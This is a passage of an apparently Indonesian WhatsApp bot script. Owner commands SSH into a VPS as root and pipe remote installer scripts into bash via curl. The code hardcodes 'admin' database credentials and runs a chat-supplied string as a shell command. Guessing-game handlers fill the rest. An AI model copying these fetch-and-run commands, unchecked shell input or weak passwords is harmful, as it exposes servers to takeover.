              if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
                await stream.write("\n")
              }
              if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
                await stream.write("\n")
              }
            }).stderr.on('data', (data) => {
              m.reply('STDERR: ' + data);
            });
          });
        }).on('error', (err) => {
          m.reply('Katasandi atau IP tidak valid')
        }).connect(connSettings)
      }
        break
      case "installpanel": {
        if (!isOwner) return reply(`Khusus Owner`)
        if (!text) return reply("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
        let vii = text.split("|")
        if (vii.length < 5) return reply("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*")
        let sukses = false

        const ress = new Client();
        const connSettings = {
          host: vii[0],
          port: '22',
          username: 'root',
          password: vii[1]
        }

        const pass = "admin" + getRandom("")
        let passwordPanel = pass
        const domainpanel = vii[2]
        const domainnode = vii[3]
        const ramserver = vii[4]
        const deletemysql = `\n`
        const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

        async function instalWings() {
          ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
              ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
                if (err) throw err;
                stream.on('close', async (code, signal) => {
                  let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
                  await cay.sendMessage(m.chat, { text: teks }, { quoted: m })
                }).on('data', async (data) => {
                  await console.log(data.toString())
                  if (data.toString().includes("Masukkan nama lokasi: ")) {
                    stream.write('Singapore\n');
                  }
                  if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                    stream.write('Node By Caywzzbot\n');
                  }
                  if (data.toString().includes("Masukkan domain: ")) {
                    stream.write(`${domainnode}\n`);
                  }
                  if (data.toString().includes("Masukkan nama node: ")) {
                    stream.write('Node By Caywzzbot\n');
                  }
                  if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                  }
                  if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                  }
                  if (data.toString().includes("Masukkan Locid: ")) {
                    stream.write('1\n');
                  }
                }).stderr.on('data', async (data) => {
                  console.log('Stderr : ' + data);
                });
              });
            }).on('data', async (data) => {
              if (data.toString().includes('Input 0-6')) {
                stream.write('1\n');
              }
              if (data.toString().includes('(y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Enter the panel address (blank for any address)')) {
                stream.write(`${domainpanel}\n`);
              }
              if (data.toString().includes('Database host username (pterodactyluser)')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('Database host password')) {
                stream.write(`admin\n`);
              }
              if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                stream.write(`${domainnode}\n`);
              }
              if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
                stream.write('admin@gmail.com\n');
              }
              console.log('Logger: ' + data.toString())
            }).stderr.on('data', (data) => {
              console.log('STDERR: ' + data);
            });
          })
        }

        async function instalPanel() {
          ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
              await instalWings()
            }).on('data', async (data) => {
              if (data.toString().includes('Input 0-6')) {
                stream.write('0\n');
              }
              if (data.toString().includes('(y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Database name (panel)')) {
                stream.write('\n');
              }
              if (data.toString().includes('Database username (pterodactyl)')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('Password (press enter to use randomly generated password)')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
                stream.write('Asia/Jakarta\n');
              }
              if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
                stream.write('admin@gmail.com\n');
              }
              if (data.toString().includes('Email address for the initial admin account')) {
                stream.write('admin@gmail.com\n');
              }
              if (data.toString().includes('Username for the initial admin account')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('First name for the initial admin account')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('Last name for the initial admin account')) {
                stream.write('admin\n');
              }
              if (data.toString().includes('Password for the initial admin account')) {
                stream.write(`${passwordPanel}\n`);
              }
              if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
                stream.write(`${domainpanel}\n`);
              }
              if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
                stream.write('y\n')
              }
              if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
                stream.write('1\n');
              }
              if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('(yes/no)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Still assume SSL? (y/N)')) {
                stream.write('y\n');
              }
              if (data.toString().includes('Please read the Terms of Service')) {
                stream.write('y\n');
              }
              if (data.toString().includes('(A)gree/(C)ancel:')) {
                stream.write('A\n');
              }
              console.log('Logger: ' + data.toString())
            }).stderr.on('data', (data) => {
              console.log('STDERR: ' + data);
            });
          });
        }

        ress.on('ready', async () => {
          await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
          ress.exec(deletemysql, async (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
              await instalPanel();
            }).on('data', async (data) => {
              await stream.write('\t')
              await stream.write('\n')
              await console.log(data.toString())
            }).stderr.on('data', async (data) => {
              console.log('Stderr : ' + data);
            });
          });
        }).connect(connSettings);
      }
        break
      case "startwings": {
        if (!isOwner) return reply(`Khusus Owner`)
        let t = text.split('|')
        if (t.length < 3) return reply("Cara Penggunaan: IPVps|PwVps|Token")

        let ipvps = t[0]
        let passwd = t[1]
        let token = t[2]

        const connSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
        }

        const command = `${token} && systemctl start wings`
        const ress = new Client();

        ress.on('ready', () => {
          ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {
              await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
          ress.end()
            }).on('data', async (data) => {
              await console.log(data.toString())
            }).stderr.on('data', (data) => {
              stream.write("y\n")
              stream.write("systemctl start wings\n")
              m.reply('STDERR: ' + data);
            });
          });
        }).on('error', (err) => {
          console.log('Connection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
      }
        break
case 'tebakgambar':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return reply(`sedang error kak.`) 
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await cay.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar[from]) reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await cay.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await cay.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {cay.sendteks(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`)
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
case 'asahotak':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if (!isRegistered) return registerbut(noregis)
if(!isGroup) return onlyGroup()
if (!global.game) return reply(`sedang error kak.`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
